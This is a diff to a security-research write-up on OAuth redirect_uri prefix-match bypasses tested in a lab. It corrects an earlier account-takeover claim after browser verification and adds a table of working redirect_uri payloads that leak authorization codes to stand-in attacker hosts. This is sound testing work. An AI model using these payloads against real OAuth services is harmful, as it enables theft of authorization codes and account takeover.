@@ -97,26 +97,34 @@ redirect_uri=https://acme.example/.evil.example.com/x
 ```
 **Server accepts** (prefix matches `https://acme.example/`). But the browser parses this URL as a path under `acme.example` — the code does NOT reach `evil.example.com`. Server-side flaw confirmed, browser-side bypass NOT actually exploitable as-is.
 
-#### Attack B — userinfo `@` bypass ✓ EXPLOITS
+#### Attack B — userinfo `@` bypass (corrected by Phase 3.1 browser verification)
+
 ```
 redirect_uri=https://acme.example/@evil.example.com/
 # → HTTP 302 | Location: https://acme.example/@evil.example.com/?code=...
 ```
-**Server accepts** (string starts with `https://acme.example/`). And per RFC 3986, the browser parses this URL as:
+
+**Server-side analysis (original Phase 2F):** the URL starts with `https://acme.example/`, so the `startswith()` prefix-check passes. 302 issued, code in query.
+
+**Phase 3.1 correction — browser-execution verification disproves the "code reaches attacker" claim against THIS specific lab.** When Playwright/Chromium navigates to `https://acme.example/@evil.example.com/?code=...`, the WHATWG URL parser (which all modern browsers use) reads it as:
 
 - scheme: `https`
-- userinfo: `acme.example` (the part before `@`)
-- **host: `evil.example.com`**
-- path: `/`
+- host: `acme.example` ← stops at the FIRST `/` after `://`
+- path: `/@evil.example.com/`
 
-**The browser navigates to `evil.example.com` and the auth code lands in attacker's logs.** This is the textbook OAuth redirect_uri-takeover.
+The `@` is just a path character because there's already a `/` between `acme.example` and `@`. **The auth code lands at `acme.example`, NOT `evil.example.com`.** The original RFC-3986-userinfo claim was wrong for this lab configuration.
 
-Chain to ATO:
-1. Attacker crafts URL: `https://acme.example/oauth/authorize?client_id=acme-spa&redirect_uri=https://acme.example/@evil.example.com/`
-2. Victim clicks; legitimate `acme.example` login succeeds
-3. Browser redirects to `evil.example.com?code=AUTH_CODE`
-4. Attacker exchanges `AUTH_CODE` for `access_token` at `acme.example/oauth/token`
-5. Attacker now has victim's account access
+The vulnerability class IS real — but the working attack shape depends on whether the registered prefix has a trailing slash:
+
+| Server prefix | Working @-userinfo attack | Result |
+|---|---|---|
+| `https://acme.example` (NO trailing slash) | `https://acme.example@evil.com/x` | Browser navigates to `evil.com` ✓ |
+| `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/x` | Browser stays on `acme.example` ✗ |
+| `https://acme.example` (substring match) | `https://acme.example.evil.com/x` | Browser navigates to `acme.example.evil.com` ✓ |
+
+See `docs/verification/phase3-playwright-browser-execution.md` Test 29 for the live Playwright trace confirming the correct attack shape against a no-trailing-slash prefix.
+
+**Operational rule (now in `hunt-oauth`):** server-side prefix-match flaw is necessary but NOT sufficient for browser-level ATO. Always headless-test the final navigation before writing the finding as "ATO chain via @-userinfo bypass". The Phase 2F lab's trailing-slash prefix means the chain was technically blocked at the browser-parse layer.
 
 #### Attack C — path-traversal append
 ```
